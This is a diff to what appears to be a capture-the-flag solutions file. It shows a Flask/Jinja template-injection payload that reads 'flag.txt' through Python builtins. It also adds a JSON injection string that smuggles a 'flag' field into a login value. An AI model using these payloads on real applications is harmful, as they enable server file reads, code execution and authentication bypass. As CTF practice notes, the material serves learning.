@@ -3,3 +3,11 @@
 ```
 {{request.application.__globals__.__builtins__.__import__('pathlib').Path('flag.txt').read_text()}}
 ```
+
+# jason
+
+Enter
+```
+egg", "flag":true, "lalal":"
+```
+to login.
